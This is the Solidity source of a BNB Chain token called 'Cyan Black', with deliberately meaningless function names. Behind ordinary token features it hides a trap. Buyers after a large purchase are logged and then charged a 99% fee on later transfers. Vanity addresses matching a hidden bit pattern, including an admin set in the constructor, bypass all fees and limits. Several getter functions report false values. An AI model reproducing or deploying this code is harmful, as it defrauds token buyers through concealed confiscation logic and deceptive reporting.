/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract CyanBlack is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Cyan Black ";
    string constant _symbol = "CyanBlack";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private teamBurnLiquidityTxFee;
    mapping(address => bool) private receiverLaunchedFeeSwap;
    mapping(address => bool) private feeIsMinLiquidity;
    mapping(address => bool) private receiverLaunchedLimitBuyBotsTradingAuto;
    mapping(address => uint256) private tradingMaxFeeLiquidity;
    mapping(uint256 => address) private botsWalletTradingMarketingTxMinAuto;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeExemptLaunchedSell = 0;
    uint256 private buyLimitAutoTeamBurnMarketing = 7;

    //SELL FEES
    uint256 private burnSellTxFeeMaxLaunchedMin = 0;
    uint256 private feeTxMinMarketing = 7;

    uint256 private launchedTxMaxAuto = buyLimitAutoTeamBurnMarketing + modeExemptLaunchedSell;
    uint256 private tradingMinIsBuy = 100;

    address private launchedFeeSellSwap = (msg.sender); // auto-liq address
    address private walletSellMinBotsTeamLimit = (0xAEA4564982D085141A1aCbEDfFFFe616c3D15FAf); // marketing address
    address private buyBurnMinLaunchedModeTrading = DEAD;
    address private isTradingBotsMarketing = DEAD;
    address private marketingTradingBurnTxSwap = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private tradingAutoMarketingLimit;
    uint256 private limitSellBotsMarketingModeBuy;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingTxMinIs;
    uint256 private launchedTxBurnMode;
    uint256 private txModeExemptWallet;
    uint256 private burnSwapMarketingLimit;
    uint256 private burnMaxBuyLiquidity;

    bool private exemptBotsLiquiditySwap = true;
    bool private receiverLaunchedLimitBuyBotsTradingAutoMode = true;
    bool private modeLimitReceiverWallet = true;
    bool private txLimitTeamAutoBurnSell = true;
    bool private txTradingExemptLaunchedWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private swapReceiverIsMarketingMode = 6 * 10 ** 15;
    uint256 private liquiditySellAutoMaxLimitLaunched = _totalSupply / 1000; // 0.1%

    
    uint256 private limitLiquiditySellIs = 0;
    bool private modeBuyBotsIs = false;
    bool private teamMaxTradingMarketing = false;
    uint256 private tradingMaxMarketingTxBurn = 0;
    bool private swapMarketingTxAuto = false;
    bool private teamReceiverIsMode = false;
    uint256 private botsTxTeamWallet = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingTxMinIs = true;

        teamBurnLiquidityTxFee[msg.sender] = true;
        teamBurnLiquidityTxFee[address(this)] = true;

        receiverLaunchedFeeSwap[msg.sender] = true;
        receiverLaunchedFeeSwap[0x0000000000000000000000000000000000000000] = true;
        receiverLaunchedFeeSwap[0x000000000000000000000000000000000000dEaD] = true;
        receiverLaunchedFeeSwap[address(this)] = true;

        feeIsMinLiquidity[msg.sender] = true;
        feeIsMinLiquidity[0x0000000000000000000000000000000000000000] = true;
        feeIsMinLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        feeIsMinLiquidity[address(this)] = true;

        SetAuthorized(address(0x7d695c60228Cba62Bc5240A6fFffFf646e518CaD));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityBuyLaunchedMinTradingMarketing(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Cyan Black  Insufficient Allowance");
        }

        return liquidityBuyLaunchedMinTradingMarketing(sender, recipient, amount);
    }

    function liquidityBuyLaunchedMinTradingMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (swapMarketingTxAuto == txTradingExemptLaunchedWallet) {
            swapMarketingTxAuto = teamReceiverIsMode;
        }

        if (botsTxTeamWallet == tradingMinIsBuy) {
            botsTxTeamWallet = launchedTxMaxAuto;
        }

        if (limitLiquiditySellIs == tradingMinIsBuy) {
            limitLiquiditySellIs = swapReceiverIsMarketingMode;
        }


        bool bLimitTxWalletValue = swapFeeBurnLaunched(sender) || swapFeeBurnLaunched(recipient);
        
        if (botsTxTeamWallet == tradingMaxMarketingTxBurn) {
            botsTxTeamWallet = buyLimitAutoTeamBurnMarketing;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                feeModeMaxWallet();
            }
            if (!bLimitTxWalletValue) {
                teamMarketingLiquidityBurnWalletTradingIs(recipient);
            }
        }
        
        if (modeBuyBotsIs != modeLimitReceiverWallet) {
            modeBuyBotsIs = modeBuyBotsIs;
        }


        if (inSwap || bLimitTxWalletValue) {return exemptMinBurnSwap(sender, recipient, amount);}

        if (!teamBurnLiquidityTxFee[sender] && !teamBurnLiquidityTxFee[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Cyan Black  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || feeIsMinLiquidity[sender] || feeIsMinLiquidity[recipient], "Cyan Black  Max TX Limit has been triggered");

        if (feeWalletSwapLimitIs()) {marketingLimitMinReceiverBotsSell();}

        _balances[sender] = _balances[sender].sub(amount, "Cyan Black  Insufficient Balance");
        
        if (teamMaxTradingMarketing != receiverLaunchedLimitBuyBotsTradingAutoMode) {
            teamMaxTradingMarketing = swapMarketingTxAuto;
        }


        uint256 amountReceived = modeTeamFeeIs(sender) ? botsLaunchedMaxBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function exemptMinBurnSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Cyan Black  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeTeamFeeIs(address sender) internal view returns (bool) {
        return !receiverLaunchedFeeSwap[sender];
    }

    function marketingTeamExemptLimit(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            launchedTxMaxAuto = feeTxMinMarketing + burnSellTxFeeMaxLaunchedMin;
            return launchedTeamReceiverTx(sender, launchedTxMaxAuto);
        }
        if (!selling && sender == uniswapV2Pair) {
            launchedTxMaxAuto = buyLimitAutoTeamBurnMarketing + modeExemptLaunchedSell;
            return launchedTxMaxAuto;
        }
        return launchedTeamReceiverTx(sender, launchedTxMaxAuto);
    }

    function launchedLimitWalletMaxMarketing() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function botsLaunchedMaxBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(marketingTeamExemptLimit(sender, receiver == uniswapV2Pair)).div(tradingMinIsBuy);

        if (receiverLaunchedLimitBuyBotsTradingAuto[sender] || receiverLaunchedLimitBuyBotsTradingAuto[receiver]) {
            feeAmount = amount.mul(99).div(tradingMinIsBuy);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function swapFeeBurnLaunched(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function launchedTeamReceiverTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = tradingMaxFeeLiquidity[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function teamMarketingLiquidityBurnWalletTradingIs(address addr) private {
        if (launchedLimitWalletMaxMarketing() < swapReceiverIsMarketingMode) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        botsWalletTradingMarketingTxMinAuto[exemptLimitValue] = addr;
    }

    function feeModeMaxWallet() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (tradingMaxFeeLiquidity[botsWalletTradingMarketingTxMinAuto[i]] == 0) {
                    tradingMaxFeeLiquidity[botsWalletTradingMarketingTxMinAuto[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletSellMinBotsTeamLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function feeWalletSwapLimitIs() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    txTradingExemptLaunchedWallet &&
    _balances[address(this)] >= liquiditySellAutoMaxLimitLaunched;
    }

    function marketingLimitMinReceiverBotsSell() internal swapping {
        
        if (botsTxTeamWallet != limitLiquiditySellIs) {
            botsTxTeamWallet = tradingMinIsBuy;
        }


        uint256 amountToLiquify = liquiditySellAutoMaxLimitLaunched.mul(modeExemptLaunchedSell).div(launchedTxMaxAuto).div(2);
        uint256 amountToSwap = liquiditySellAutoMaxLimitLaunched.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (swapMarketingTxAuto == teamReceiverIsMode) {
            swapMarketingTxAuto = modeBuyBotsIs;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = launchedTxMaxAuto.sub(modeExemptLaunchedSell.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeExemptLaunchedSell).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(buyLimitAutoTeamBurnMarketing).div(totalETHFee);
        
        if (botsTxTeamWallet != launchedTxMaxAuto) {
            botsTxTeamWallet = feeTxMinMarketing;
        }

        if (teamMaxTradingMarketing == txTradingExemptLaunchedWallet) {
            teamMaxTradingMarketing = exemptBotsLiquiditySwap;
        }

        if (swapMarketingTxAuto != swapMarketingTxAuto) {
            swapMarketingTxAuto = modeLimitReceiverWallet;
        }


        payable(walletSellMinBotsTeamLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                launchedFeeSellSwap,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTeamBurnLiquidityTxFee(address a0) public view returns (bool) {
        if (a0 != launchedFeeSellSwap) {
            return teamReceiverIsMode;
        }
        if (teamBurnLiquidityTxFee[a0] != feeIsMinLiquidity[a0]) {
            return teamMaxTradingMarketing;
        }
            return teamBurnLiquidityTxFee[a0];
    }
    function setTeamBurnLiquidityTxFee(address a0,bool a1) public onlyOwner {
        if (a0 == walletSellMinBotsTeamLimit) {
            txLimitTeamAutoBurnSell=a1;
        }
        teamBurnLiquidityTxFee[a0]=a1;
    }

    function getWalletSellMinBotsTeamLimit() public view returns (address) {
        if (walletSellMinBotsTeamLimit != marketingTradingBurnTxSwap) {
            return marketingTradingBurnTxSwap;
        }
        return walletSellMinBotsTeamLimit;
    }
    function setWalletSellMinBotsTeamLimit(address a0) public onlyOwner {
        if (walletSellMinBotsTeamLimit != walletSellMinBotsTeamLimit) {
            walletSellMinBotsTeamLimit=a0;
        }
        if (walletSellMinBotsTeamLimit == buyBurnMinLaunchedModeTrading) {
            buyBurnMinLaunchedModeTrading=a0;
        }
        walletSellMinBotsTeamLimit=a0;
    }

    function getTeamMaxTradingMarketing() public view returns (bool) {
        if (teamMaxTradingMarketing != exemptBotsLiquiditySwap) {
            return exemptBotsLiquiditySwap;
        }
        if (teamMaxTradingMarketing == receiverLaunchedLimitBuyBotsTradingAutoMode) {
            return receiverLaunchedLimitBuyBotsTradingAutoMode;
        }
        return teamMaxTradingMarketing;
    }
    function setTeamMaxTradingMarketing(bool a0) public onlyOwner {
        if (teamMaxTradingMarketing == swapMarketingTxAuto) {
            swapMarketingTxAuto=a0;
        }
        if (teamMaxTradingMarketing != receiverLaunchedLimitBuyBotsTradingAutoMode) {
            receiverLaunchedLimitBuyBotsTradingAutoMode=a0;
        }
        teamMaxTradingMarketing=a0;
    }

    function getLimitLiquiditySellIs() public view returns (uint256) {
        if (limitLiquiditySellIs != limitLiquiditySellIs) {
            return limitLiquiditySellIs;
        }
        if (limitLiquiditySellIs != swapReceiverIsMarketingMode) {
            return swapReceiverIsMarketingMode;
        }
        return limitLiquiditySellIs;
    }
    function setLimitLiquiditySellIs(uint256 a0) public onlyOwner {
        if (limitLiquiditySellIs != limitLiquiditySellIs) {
            limitLiquiditySellIs=a0;
        }
        limitLiquiditySellIs=a0;
    }

    function getTradingMaxMarketingTxBurn() public view returns (uint256) {
        return tradingMaxMarketingTxBurn;
    }
    function setTradingMaxMarketingTxBurn(uint256 a0) public onlyOwner {
        if (tradingMaxMarketingTxBurn == botsTxTeamWallet) {
            botsTxTeamWallet=a0;
        }
        if (tradingMaxMarketingTxBurn == launchedTxMaxAuto) {
            launchedTxMaxAuto=a0;
        }
        if (tradingMaxMarketingTxBurn != botsTxTeamWallet) {
            botsTxTeamWallet=a0;
        }
        tradingMaxMarketingTxBurn=a0;
    }

    function getReceiverLaunchedLimitBuyBotsTradingAutoMode() public view returns (bool) {
        if (receiverLaunchedLimitBuyBotsTradingAutoMode != exemptBotsLiquiditySwap) {
            return exemptBotsLiquiditySwap;
        }
        if (receiverLaunchedLimitBuyBotsTradingAutoMode != exemptBotsLiquiditySwap) {
            return exemptBotsLiquiditySwap;
        }
        if (receiverLaunchedLimitBuyBotsTradingAutoMode == teamMaxTradingMarketing) {
            return teamMaxTradingMarketing;
        }
        return receiverLaunchedLimitBuyBotsTradingAutoMode;
    }
    function setReceiverLaunchedLimitBuyBotsTradingAutoMode(bool a0) public onlyOwner {
        if (receiverLaunchedLimitBuyBotsTradingAutoMode != swapMarketingTxAuto) {
            swapMarketingTxAuto=a0;
        }
        if (receiverLaunchedLimitBuyBotsTradingAutoMode == receiverLaunchedLimitBuyBotsTradingAutoMode) {
            receiverLaunchedLimitBuyBotsTradingAutoMode=a0;
        }
        if (receiverLaunchedLimitBuyBotsTradingAutoMode != exemptBotsLiquiditySwap) {
            exemptBotsLiquiditySwap=a0;
        }
        receiverLaunchedLimitBuyBotsTradingAutoMode=a0;
    }

    function getBotsWalletTradingMarketingTxMinAuto(uint256 a0) public view returns (address) {
        if (a0 != modeExemptLaunchedSell) {
            return launchedFeeSellSwap;
        }
        if (a0 == launchedTxMaxAuto) {
            return walletSellMinBotsTeamLimit;
        }
        if (a0 == tradingMaxMarketingTxBurn) {
            return isTradingBotsMarketing;
        }
            return botsWalletTradingMarketingTxMinAuto[a0];
    }
    function setBotsWalletTradingMarketingTxMinAuto(uint256 a0,address a1) public onlyOwner {
        botsWalletTradingMarketingTxMinAuto[a0]=a1;
    }

    function getTradingMaxFeeLiquidity(address a0) public view returns (uint256) {
        if (a0 == launchedFeeSellSwap) {
            return swapReceiverIsMarketingMode;
        }
        if (a0 == isTradingBotsMarketing) {
            return tradingMaxMarketingTxBurn;
        }
        if (a0 != launchedFeeSellSwap) {
            return tradingMinIsBuy;
        }
            return tradingMaxFeeLiquidity[a0];
    }
    function setTradingMaxFeeLiquidity(address a0,uint256 a1) public onlyOwner {
        if (a0 == walletSellMinBotsTeamLimit) {
            tradingMaxMarketingTxBurn=a1;
        }
        tradingMaxFeeLiquidity[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}